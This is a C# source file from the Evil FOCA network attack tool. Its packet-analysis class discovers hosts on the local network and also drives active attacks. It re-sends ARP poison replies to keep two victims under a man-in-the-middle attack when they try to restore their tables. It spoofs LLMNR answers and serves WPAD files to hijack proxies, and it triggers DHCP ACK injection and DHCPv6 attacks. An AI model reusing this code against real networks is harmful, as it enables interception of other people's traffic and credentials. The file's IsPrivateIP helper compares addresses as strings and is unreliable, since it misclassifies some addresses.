/* 
Evil FOCA
Copyright (C) 2015 ElevenPaths

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Net;
using evilfoca.Data;
using SharpPcap.WinPcap;
using SharpPcap.LibPcap;
using evilfoca.Attacks;
using System.IO;
using System.Threading;
using System.Diagnostics;
using evilfoca.HTTP;

namespace evilfoca.Core
{
    public class PasiveScan
    {
        public Packet packetToAnalyze { get; set; }
        public ManualResetEvent doneEvent { get; set; }

        public event EventHandler<NeighborEventArgs> NewNeighbor;
        public event EventHandler<ArpEventArgs> NewARP;
        public event EventHandler<PacketEventArgs> NewICMPv6Solicitation;
        public event EventHandler<PacketEventArgs> NewICMPv6Advertisement;


        PhysicalAddress localPhysicalAddress;
        WinPcapDevice device;

        Router route; // Se encarga de enrutar paquetes
        PasivePortScanner pasivePortScan; // Analiza los paquetes TCP/UDP para detectar servicios o puertos abiertos

        DHCPACKInjection DHCPACKInjection;
        Attacks.DHCPIpv6 DHCPIpv6;

        SynchronizedCollection<Data.Attack> attacks;
        IList<Data.Neighbor> neighbors;

        public PasiveScan(WinPcapDevice device, SynchronizedCollection<Data.Attack> attacks, IList<Data.Neighbor> neighbors, SynchronizedCollection<string> slaacReqs)
        {
            this.device = device;
            this.localPhysicalAddress = device.MacAddress;
            this.attacks = attacks;
            this.neighbors = neighbors;

            this.route = new Router(device, attacks, slaacReqs);
            this.pasivePortScan = new PasivePortScanner(neighbors);
            /* Ataques pasivos */
            this.DHCPACKInjection = new DHCPACKInjection(device, attacks);
            this.DHCPIpv6 = new DHCPIpv6(device, attacks);
        }

        public void ThreadPoolCallback(Object threadContext)
        {

            int threadIndex = (int)threadContext;

            this.AnalyzePacket(packetToAnalyze);

            doneEvent.Set();
        }


        public void AnalyzePacket(Packet p)
        {
            try
            {
                if (p is EthernetPacket)
                {
                    if (p.PayloadPacket == null)
                        return;

                    //Para que no se procesen los paquetes del DoS 
                    if ((p as EthernetPacket).SourceHwAddress.Equals(DoSSLAAC.MACsrc))
                        return;

                    if (p.PayloadPacket is ARPPacket)
                        AnalyzeARP(p);

                    if (p.PayloadPacket is IPv6Packet)
                        AnalyzeIPv6Packet(p);
                    else if (p.PayloadPacket is IPv4Packet)
                        AnalyzeIPv4Packet(p);
                    AnalyzeLLMNR(p);

                    // Ataque pasivo DHCP ACK Injector en Ipv4

                    if ((attacks.Where(A => A.attackType == AttackType.DHCPACKInjection && A.attackStatus == AttackStatus.Attacking).Count() > 0))
                    {
                        if (DHCPACKInjection.CheckIfIsDHCP(p))
                            DHCPACKInjection.AnalyzePacket(device, p);
                    }

                    // Ataque pasivo DHCP IPv6
                    if ((attacks.Where(A => A.attackType == AttackType.DHCPIpv6 && A.attackStatus == AttackStatus.Attacking).Count() > 0))
                    {
                        if (DHCPIpv6.CheckIfIsRequestDHCPIpv6(p))
                            DHCPIpv6.AnalyzePacket(device, p);
                    }

                    OSDetector.AnalyzePacket(p);
                    pasivePortScan.AnalyzePacket(p);

                    route.CheckToRoutePacket(p);
                }
            }
            catch
            {
                // Paquete perdido!!!
            }
        }

        private void AnalyzeARP(Packet packet)
        {
            if (!(packet.PayloadPacket is ARPPacket))
                return;
            if (!(packet is EthernetPacket))
                return;

            EthernetPacket ethernet = (EthernetPacket)packet;
            ARPPacket arp = (ARPPacket)packet.PayloadPacket;

            // Si el paquete va dirigido a nuestra MAC...
            if (ethernet.DestinationHwAddress.Equals(localPhysicalAddress))
            {
                PhysicalAddress mac = arp.SenderHardwareAddress;
                IPAddress ip = arp.SenderProtocolAddress;

                Neighbor neighbor = Program.CurrentProject.data.GetNeighbor(mac);
                if (neighbor == null)
                {
                    // Creamos el vecino
                    neighbor = new Neighbor();
                    neighbor.physicalAddress = mac;
                    neighbor.AddIP(ip);
                    Program.CurrentProject.data.AddNeighbor(neighbor);
                    NewNeighbor(this, new NeighborEventArgs(neighbor));
                }
                else
                {
                    // Si ya existe, comprobamos si tiene la iP ipv4 y se la añadimos (en caso de que lo la tenga)
                    if (!neighbor.ExistsIP(ip))
                    {
                        neighbor.AddIP(ip);
                        Program.CurrentProject.data.AddNeighbor(neighbor);
                    }

                }
            }
            // Si va dirigido a broadcast ...
            else if (ethernet.DestinationHwAddress.Equals(PhysicalAddress.Parse("FF-FF-FF-FF-FF-FF")))
            {
                // Si los que están "negociando" las tablas ARP están siendo atacados por un MITM,
                // se les vuelve a atacar envenenando sus tablas

                if (arp.Operation == ARPOperation.Request)
                {
                    PhysicalAddress senderMac = arp.SenderHardwareAddress;
                    PhysicalAddress destinationMac = arp.TargetHardwareAddress;
                    IPAddress senderIp = arp.SenderProtocolAddress;
                    IPAddress destinationIp = arp.TargetProtocolAddress;

                    SynchronizedCollection<Attack> lstAttacks = Program.CurrentProject.data.GetAttacks();

                    // En caso de MITM ARP -> Si el equipo está intentando restablecer su tabla ARP ... se le vuelve a envenenar
                    foreach (Attack attk in lstAttacks.Where(A => (A.attackType == AttackType.ARPSpoofing || A.attackType == AttackType.InvalidMacSpoofIpv4) && A.attackStatus == AttackStatus.Attacking))
                    {
                        if (attk is MitmAttack)
                        {
                            MitmAttack mitmArp = (MitmAttack)attk;
                            if (
                                ((mitmArp.t1.ip.Equals(senderIp)) || (mitmArp.t1.ip.Equals(destinationIp)))
                                &&
                                ((mitmArp.t2.ip.Equals(senderIp)) || (mitmArp.t2.ip.Equals(destinationIp)))
                                )
                            {
                                // Lo envia a ambas partes del ataque, se vuelve a envenenar a los dos equipos
                                // (aunque unicamente sería necesario al que hace la solicitud (request)

                                ethernet = Attacks.ARPSpoofing.GenerateResponseArpPoison(device.Interface.MacAddress,
                                    ((MitmAttack)mitmArp).t2.mac,
                                    ((MitmAttack)mitmArp).t2.ip,
                                    ((MitmAttack)mitmArp).t1.ip);
                                Program.CurrentProject.data.SendPacket(ethernet);

                                ethernet = Attacks.ARPSpoofing.GenerateResponseArpPoison(device.Interface.MacAddress,
                                    ((MitmAttack)mitmArp).t1.mac,
                                    ((MitmAttack)mitmArp).t1.ip,
                                    ((MitmAttack)mitmArp).t2.ip);
                                Program.CurrentProject.data.SendPacket(ethernet);
                            }
                        }
                        else if (attk is InvalidMacSpoofAttackIpv4Attack)
                        {
                            ethernet = Attacks.ARPSpoofing.GenerateResponseArpPoison(device.Interface.MacAddress,
                        ((InvalidMacSpoofAttackIpv4Attack)attk).t2.mac,
                        ((InvalidMacSpoofAttackIpv4Attack)attk).t2.ip,
                        ((InvalidMacSpoofAttackIpv4Attack)attk).t1.ip);
                            Program.CurrentProject.data.SendPacket(ethernet);
                        }
                    }
                }
            }

            OnNewARP(new ArpEventArgs(packet));
        }

        private void AnalyzeLLMNR(Packet packet)
        {
            if (!(packet is EthernetPacket))
                return;

            // IPv4 y IPv6
            if (packet.PayloadPacket.PayloadPacket is UdpPacket)
            {
                // Respuestas de LLMNR. De aqui podemos capturar el nombre.
                if ((((UdpPacket)(packet.PayloadPacket.PayloadPacket)).SourcePort == 5355) && (((EthernetPacket)packet).Type == EthernetPacketType.IpV4))
                {
                    LLMNR.LLMNRAnswer LLMNRAnswer = new LLMNR.LLMNRAnswer(packet.PayloadPacket.PayloadPacket.PayloadData);

                    //  Solo lo cojemos las respuestas que son de tipo PTR o de tipo A
                    if (LLMNRAnswer.isPtrResponse == true && LLMNRAnswer.computerName != string.Empty)
                    {
                        Neighbor neighbor = Program.CurrentProject.data.GetNeighbor(((EthernetPacket)(packet)).SourceHwAddress);

                        if (neighbor == null)
                        {
                            neighbor = new Neighbor();
                            neighbor.computerName = LLMNRAnswer.computerName;
                            neighbor.AddIP(LLMNRAnswer.ipAddress);
                            neighbor.physicalAddress = ((EthernetPacket)(packet)).SourceHwAddress;
                            Program.CurrentProject.data.AddNeighbor(neighbor);
                            NewNeighbor(this, new NeighborEventArgs(neighbor));
                        }
                        else
                        {
                            neighbor.computerName = LLMNRAnswer.computerName;
                            Program.CurrentProject.data.AddNeighbor(neighbor);
                        }
                    }
                }


                if ((((EthernetPacket)packet).Type == EthernetPacketType.IpV4) && (((UdpPacket)(packet.PayloadPacket.PayloadPacket)).DestinationPort == 5355))
                {
                    SynchronizedCollection<Attack> lstAttacks = Program.CurrentProject.data.GetAttacks();

                    // En caso de MITM ARP -> Si el equipo está intentando restablecer su tabla ARP ... se le vuelve a envenenar
                    foreach (Attack attk in lstAttacks.Where(A => A.attackType == AttackType.WpadIPv4 && A.attackStatus == AttackStatus.Attacking))
                    {
                        MitmAttack mitmAtt = (MitmAttack)attk;
                        if (((IPv4Packet)((EthernetPacket)packet).PayloadPacket).SourceAddress.Equals(mitmAtt.t2.ip))
                            WpadIPv4Attack.Instance.GenerateLLMNRResponse(packet);
                    }

                }

                if ((((EthernetPacket)packet).Type == EthernetPacketType.IpV6) && (((UdpPacket)(packet.PayloadPacket.PayloadPacket)).DestinationPort == 5355))
                {
                    SynchronizedCollection<Attack> lstAttacks = Program.CurrentProject.data.GetAttacks();

                    // En caso de MITM ARP -> Si el equipo está intentando restablecer su tabla ARP ... se le vuelve a envenenar
                    foreach (Attack attk in lstAttacks.Where(A => A.attackType == AttackType.WpadIPv6 && A.attackStatus == AttackStatus.Attacking))
                    {
                        MitmAttack mitmAtt = (MitmAttack)attk;
                        if (((IPv6Packet)((EthernetPacket)packet).PayloadPacket).SourceAddress.Equals(mitmAtt.t2.ip))
                            WpadIPv6Attack.Instance.GenerateLLMNRResponse(packet);
                    }
                }
            }
        }

        private void AnalyzeIPv4Packet(Packet packet)
        {
            if (!(packet.PayloadPacket is IPv4Packet))
                return;
            if (!(packet is EthernetPacket))
                return;

            PhysicalAddress macSrc = ((EthernetPacket)packet).SourceHwAddress;
            PhysicalAddress macDst = ((EthernetPacket)packet).DestinationHwAddress;
            IPAddress ipSrc = ((IPv4Packet)(((EthernetPacket)packet).PayloadPacket)).SourceAddress;
            IPAddress ipDst = ((IPv4Packet)(((EthernetPacket)packet).PayloadPacket)).DestinationAddress;

            Data.Neighbor neighborSrc = new Data.Neighbor();
            Data.Neighbor neighborDst = new Data.Neighbor();

            neighborSrc.physicalAddress = macSrc;
            neighborSrc.AddIP(ipSrc);
            neighborDst.physicalAddress = macDst;
            neighborDst.AddIP(ipDst);

            if (IsPrivateIP(ipSrc))
            {
                // [ Si no se envia desde nuestra mac ] Y [ el vecino no existe ] -> Se crea el vecino
                if (!macSrc.Equals(localPhysicalAddress) && !Program.CurrentProject.data.ExistsNeighbor(macSrc))
                {
                    if ((neighborSrc.GetIPs().Count > 0) && !(macSrc.ToString() == "FFFFFFFFFFFF"))
                    {
                        Program.CurrentProject.data.AddNeighbor(neighborSrc);
                        OnNewNeighbor(new NeighborEventArgs(neighborSrc));
                    }
                }
                // En caso de que el vecino (mac) tenga una nueva IP, se la añadimos
                if (Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress) != null &&
                     !Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress).ExistsIP(ipSrc))
                {
                    Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress).AddIP(ipSrc);
                    Program.CurrentProject.data.AddNeighbor(neighborSrc);
                }
            }

            if (IsPrivateIP(ipDst))
            {
                // [ Si el destino no es nuestra mac ] Y [ el vecino no existe ] -> Se crea el vecino
                if (!macDst.Equals(localPhysicalAddress) && !Program.CurrentProject.data.ExistsNeighbor(macDst))
                {
                    if ((neighborDst.GetIPs().Count > 0) && !(macDst.ToString() == "FFFFFFFFFFFF") && !(macDst.ToString() == "000000000000"))
                    {
                        Program.CurrentProject.data.AddNeighbor(neighborDst);
                        OnNewNeighbor(new NeighborEventArgs(neighborDst));
                    }
                }
                if (Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress) != null &&
                     !Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress).ExistsIP(ipDst))
                {
                    Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress).AddIP(ipDst);
                    Program.CurrentProject.data.AddNeighbor(neighborDst);
                }
            }



            if ((packet.PayloadPacket.PayloadPacket is TcpPacket)
                && (((TcpPacket)(packet.PayloadPacket.PayloadPacket)).DestinationPort == 80)
                && (((EthernetPacket)packet).Type == EthernetPacketType.IpV4)
                && ((IPv4Packet)(((EthernetPacket)packet).PayloadPacket)).DestinationAddress.Equals(Program.CurrentProject.data.GetIPv4FromDevice(device)))
            {
                SynchronizedCollection<Attack> lstAttacks = Program.CurrentProject.data.GetAttacks();

                foreach (Attack attk in lstAttacks.Where(A => A.attackType == AttackType.WpadIPv4 && A.attackStatus == AttackStatus.Attacking))
                {
                    MitmAttack mitmAtt = (MitmAttack)attk;
                    if (((IPv4Packet)((EthernetPacket)packet).PayloadPacket).SourceAddress.Equals(mitmAtt.t2.ip))
                        WpadIPv4Attack.Instance.SendWpadFile(packet);
                }
            }
        }

        private void AnalyzeIPv6Packet(Packet packet)
        {
            if (!(packet.PayloadPacket is IPv6Packet))
                return;
            if (!(packet is EthernetPacket))
                return;

            PhysicalAddress macSrc = ((EthernetPacket)packet).SourceHwAddress;
            PhysicalAddress macDst = ((EthernetPacket)packet).DestinationHwAddress;
            IPAddress ipSrc = ((IPv6Packet)(((EthernetPacket)packet).PayloadPacket)).SourceAddress;
            IPAddress ipDst = ((IPv6Packet)(((EthernetPacket)packet).PayloadPacket)).DestinationAddress;

            Data.Neighbor neighborSrc = new Data.Neighbor();
            Data.Neighbor neighborDst = new Data.Neighbor();

            neighborSrc.physicalAddress = macSrc;
            neighborSrc.AddIP(ipSrc);
            neighborDst.physicalAddress = macDst;
            neighborDst.AddIP(ipDst);

            if ((ipSrc.IsIPv6LinkLocal) && (ipDst.IsIPv6LinkLocal || ipDst.IsIPv6Multicast) && (packet.PayloadPacket.PayloadPacket is ICMPv6Packet))
                AnalyzeICMPv6Packet(packet);

            if (ipSrc.IsIPv6LinkLocal)
            {
                // [ Si no se envia desde nuestra mac ] Y [ el vecino no existe ] -> Se crea el vecino
                if (!macSrc.Equals(localPhysicalAddress) && !Program.CurrentProject.data.ExistsNeighbor(macSrc))
                {
                    Program.CurrentProject.data.AddNeighbor(neighborSrc);
                    OnNewNeighbor(new NeighborEventArgs(neighborSrc));
                }
                // En caso de que el vecino (mac) tenga una nueva IP, se la añadimos
                if (Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress) != null &&
                     !Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress).ExistsIP(ipSrc))
                {
                    Program.CurrentProject.data.GetNeighbor(neighborSrc.physicalAddress).AddIP(ipSrc);
                    Program.CurrentProject.data.AddNeighbor(neighborSrc);
                }
            }

            if (ipDst.IsIPv6LinkLocal)
            {
                // [ Si el destino no es nuestra mac ] Y [ el vecino no existe ] -> Se crea el vecino
                if (!macDst.Equals(localPhysicalAddress) && !Program.CurrentProject.data.ExistsNeighbor(macDst))
                {
                    Program.CurrentProject.data.AddNeighbor(neighborDst);
                    OnNewNeighbor(new NeighborEventArgs(neighborDst));
                }
                if (Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress) != null &&
                     !Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress).ExistsIP(ipDst))
                {
                    Program.CurrentProject.data.GetNeighbor(neighborDst.physicalAddress).AddIP(ipDst);
                    Program.CurrentProject.data.AddNeighbor(neighborDst);
                }
            }

            if ((packet.PayloadPacket.PayloadPacket is TcpPacket)
                && (((TcpPacket)(packet.PayloadPacket.PayloadPacket)).DestinationPort == 80)
                && (((EthernetPacket)packet).Type == EthernetPacketType.IpV6)
                && ((IPv6Packet)(((EthernetPacket)packet).PayloadPacket)).DestinationAddress.Equals(Program.CurrentProject.data.GetIPv6LocalLinkFromDevice(device)))
            {
                SynchronizedCollection<Attack> lstAttacks = Program.CurrentProject.data.GetAttacks();

                foreach (Attack attk in lstAttacks.Where(A => A.attackType == AttackType.WpadIPv6 && A.attackStatus == AttackStatus.Attacking))
                {
                    MitmAttack mitmAtt = (MitmAttack)attk;
                    if (((IPv6Packet)((EthernetPacket)packet).PayloadPacket).SourceAddress.Equals(mitmAtt.t2.ip))
                        WpadIPv6Attack.Instance.SendWpadFile(packet);
                }
            }
        }

        private void AnalyzeICMPv6Packet(Packet packet)
        {
            if (!(packet.PayloadPacket.PayloadPacket is ICMPv6Packet))
                return;

            try
            {
                ICMPv6Types type = ((ICMPv6Packet)packet.PayloadPacket.PayloadPacket).Type;
                switch (type)
                {
                    case ICMPv6Types.NeighborSolicitation: // Neighbor solicitation
                        OnNewICMPv6Solicitation(new PacketEventArgs(packet));
                        break;
                    case ICMPv6Types.NeighborAdvertisement: // Neighbor advertisement
                        OnNewICMPv6Advertisement(new PacketEventArgs(packet));
                        break;
                }
            }
            catch (ArgumentOutOfRangeException)
            {
            }
        }

        private void OnNewICMPv6Solicitation(PacketEventArgs e)
        {
            EventHandler<PacketEventArgs> handler = NewICMPv6Solicitation;
            if (handler != null)
            {
                handler(this, e);
            }
        }

        private void OnNewICMPv6Advertisement(PacketEventArgs e)
        {
            EventHandler<PacketEventArgs> handler = NewICMPv6Advertisement;
            if (handler != null)
            {
                handler(this, e);
            }
        }

        private void OnNewNeighbor(NeighborEventArgs e)
        {
            EventHandler<NeighborEventArgs> handler = NewNeighbor;
            if (handler != null)
            {
                if (!e.Neighbor.physicalAddress.Equals(localPhysicalAddress))
                    handler(this, e);
            }
        }

        private void OnNewARP(ArpEventArgs e)
        {
            EventHandler<ArpEventArgs> handler = NewARP;

            if (handler != null)
            {
                handler(this, e);
            }
        }

        public static bool IsPrivateIP(IPAddress ip)
        {
            string strIP = ip.ToString();
            return ((strIP.CompareTo("10.0.0.0") >= 0 &&
                     strIP.CompareTo("10.255.255.255") <= 0) ||
                    (strIP.CompareTo("172.16.0.0") >= 0 &&
                     strIP.CompareTo("172.31.255.255") <= 0) ||
                    (strIP.CompareTo("192.168.0.0") >= 0 &&
                     strIP.CompareTo("192.168.255.255") <= 0));
        }
    }



    public class ArpEventArgs : EventArgs
    {
        public Packet p;

        public ArpEventArgs(Packet p)
        {
            this.p = p;
        }
    }

    public class PacketEventArgs : EventArgs
    {
        public Packet packet;

        public PacketEventArgs(Packet packet)
        {
            this.packet = packet;
        }
    }
}
